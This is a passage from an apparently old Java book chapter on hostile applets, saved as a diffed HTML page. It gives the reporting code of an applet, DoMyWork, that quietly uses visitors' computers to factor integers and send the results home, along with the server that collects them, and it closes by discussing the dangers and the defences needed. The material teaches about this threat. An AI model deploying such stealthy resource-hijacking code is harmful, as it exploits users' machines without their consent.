+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;localAddress
+= localHome.toString();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(UnknownHostException u) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;I
+can't get the remote host's name&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rightNow
+= new Date();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+time = rightNow.toString();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;responsebuf.append(localAddress
++ &quot;\t&quot; + time + &quot;\t&quot; +<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+teststr + &quot;\t&quot; + factorstr + &quot;\n&quot;);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response
+= responsebuf.toString();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;numberbytes
+= response.length();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;response.getBytes(0,
+numberbytes, by, 0);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;outerStream.write(by,
+0, numberbytes);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (IOException
+ioe) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(debug)<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;I
+can't talk to &quot; + home);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<HR>
+<BLOCKQUOTE>
+<B>Listing 23.13. ReportServerSocket.java.<BR>
+</B>
+</BLOCKQUOTE>
+<BLOCKQUOTE>
+<TT>/*&nbsp;&nbsp;This Java Application sets
+up a simple ServerSocket to receive<BR>
+&nbsp;&nbsp;&nbsp;&nbsp; data from the Java applet DoMyWork.java
+*/<BR>
+<BR>
+import java.applet.Applet;<BR>
+import java.awt.*;<BR>
+import java.io.*;<BR>
+import java.net.*;<BR>
+<BR>
+class ReportServerSocket{<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;public
+static void main(String args[]) {<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ServerSocket
+server;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Socket socker;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InputStream
+innerStream;<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutputStream outerStream;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+home = new String(&quot;www.math.gatech.edu&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int port = 9000;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;byte
+by[] = new byte[4096];<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int numberbytes;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String
+reply;<BR>
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if
+(args.length != 1) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Command:
+java ReportSocketServer &lt;port number&gt;&quot;);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;ReportSocketServer
+Session Starting&quot;);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;*Factor
+is the smallest prime factor of Integer*&quot;);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port = Integer.parseInt(args[0]);
+<BR>
+<BR>
+//&nbsp;&nbsp;&nbsp;&nbsp;Create the ServerSocket<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;server
+= new ServerSocket(port);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch (IOException
+ioe) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Unable
+to open port &quot; + port);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+<BR>
+//&nbsp;&nbsp;Listen for anyone sending reults back to the applet
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (true) {
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker
+= server.accept();<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;innerStream
+= socker.getInputStream();<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Accept
+failed at port &quot; + port);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;numberbytes
+= innerStream.read(by, 0, 4096);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Read
+failed at port &quot; + port);<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reply
+= new String(by, 0, 0, numberbytes);<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(&quot;Host
+Name / IP Address \t&quot; + &quot;Date&quot; +<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&quot;\t\t\t\t&quot; + &quot;Integer&nbsp;&nbsp;\t&quot; + &quot;Factor&quot;);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(reply);
+<BR>
+<BR>
+//&nbsp;&nbsp;We could send a message back, but we won't right
+now<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try
+{<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;socker.close();
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;catch
+(IOException ioe) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+System.out.println(&quot;Unable to close port &quot; + port);
+<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
+<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>
+</TT>&nbsp;<TT>&nbsp;&nbsp;&nbsp;}
+<BR>
+}</TT>
+</BLOCKQUOTE>
+<HR>
+<P>
+The applet begins by reading in three parameters from its home
+page: a delay (in seconds), a port number, and a long integer
+to be factored.
+<P>
+After the main thread, sleeper sleeps for the number of seconds
+specified by delay, then creates a Calculator object, calc, and
+a new thread, controller, in which the action takes place. Now
+<TT>calc</TT> simply creates a new
+<TT>getFactor</TT> object, <TT>doWork</TT>,
+to factor the given integer. The class <TT>getFactor</TT>
+factors an integer by trial division, and it creates a new instance
+of the <TT>Report</TT> class, <TT>sendit</TT>,
+to communicate its results back to the applet's home site. The
+Java application ReportServerSocket sets up a ServerSocket to
+listen on a specified port for these results, which are readily
+redirected to a file and which can be displayed from a Web page.
+<H3><B>The Dangers of Stealthy Applets</B></H3>
+<P>
+At first glance DoMyWork.java does not appear to be such a hostile
+applet. But while it does not attempt to annoy you and squander
+your resources, it stealthily puts your workstation to work for
+someone else, perhaps a business competitor, a criminal, or even
+a foreign government. Clearly someone could do the same thing
+with any Java program that he or she wanted you to run. To create
+an applet that does other work, you can replace the class <TT>GetFactor</TT>
+by some other class or classes, and you can adjust the classes
+<TT>Report</TT> and <TT>ReportServerSocket</TT>
+to handle whatever data you would like returned.
+<P>
+This possibility raises a tangled web of unaddressed legal and
+ethical questions, and it is at least conceivable that running
+such an applet might be illegal in some situations. For example,
+suppose that a federal employee, say from NASA, happens to download
+an applet which begins using government resources for private
+ends. Have any laws been broken, and if so, who is the guilty
+party? Now suppose that instead of factoring integers, the applet
+farms out pieces of a brute force attack to decrypt some financial
+information, and suppose that an FBI agent, doing a little lunchtime
+browsing, happens to download the applet running this decryption
+program.
+<P>
+Now what laws are being broken, and who is responsible? From these
+possibilities you see that DoMyWork.java is another very hostile
+applet.
+<P>
+You have already seen good reasons why applets may need further
+restrictions upon the network connections that they are allowed
+to make. Applets which are allowed to connect to port 25 can forge
+electronic mail, and applets connecting to port 23 for telnet
+run the risk of revealing passwords. The present example shows
+that even allowing applets to establish connections to other ports
+on their home hosts entails risks.
+<H2><A NAME="Summary"><B><FONT SIZE=5 COLOR=#FF0000>Summary</FONT></B></A>
+</H2>
+<P>
+This chapter has taken a hacker's approach to Java, and introduced
+the subject of hostile applets. It started by discussing some
+recent hostile applets developed by Princeton researchers, and
+then went on to consider a diverse collection of others: the Noisy
+Bear, a trio of gluttonous browser killers, a nasty &quot;big
+windows&quot; attack, the Applet Killer, an e-mail forger that
+gets user names, and one that silently exploits your system's
+resources. Clearly applets need not seek the Hackers' Holy Grail
+of altering, reading, and deleting files in order to be hostile.
+Sometimes it can be advantageous just to exploit someone's resources
+silently, and at other times simply being annoying and disruptive
+can achieve some ends.
+<P>
+Hostile applets come in many varieties, and it is a very difficult
+task to build effective defenses against them all.
+<P>
+Although hostile applets are not yet lurking just around every
+corner of the World Wide Web, that may change in the future. Various
+kinds have already appeared on the Web and are now readily available,
+and in the future more are certain to appear. The time to begin
+thinking seriously about them and building better defenses against
+them is now. It is clear that browsers must give their users more
+effective means for controlling applets and their threads. It
+is also clear that further restrictions will be needed on the
+network connections that applets are allowed to make. As drastic
+changes in Java seem unlikely at this time, and as a system of
+trusted sources may not appear in the near future, the Java community
+will be forced to battle hostile applets in other ways.
+<P>
+This chapter sought to expose, by means of concrete examples,
+several of the problems that remain to be faced.
+<P>
+<HR WIDTH="100%"></P>
+
+<CENTER><P><A HREF="ch22.htm"><IMG SRC="http://docs.rinet.ru/JaTricks/pc.gif" BORDER=0 HEIGHT=88
+WIDTH=140></A><A HREF="#CONTENTS"><IMG SRC="http://docs.rinet.ru/JaTricks/cc.gif" BORDER=0
+HEIGHT=88 WIDTH=140></A><A HREF="index.htm"><IMG SRC="http://docs.rinet.ru/JaTricks/hb.gif" BORDER=0
+HEIGHT=88 WIDTH=140></A><A HREF="ch24.htm"><IMG SRC="http://docs.rinet.ru/JaTricks/nc.gif" BORDER=0
+HEIGHT=88 WIDTH=140></A></P></CENTER>
+
+<P>
+<HR WIDTH="100%"></P>
+
+</BODY>
+</HTML>
+
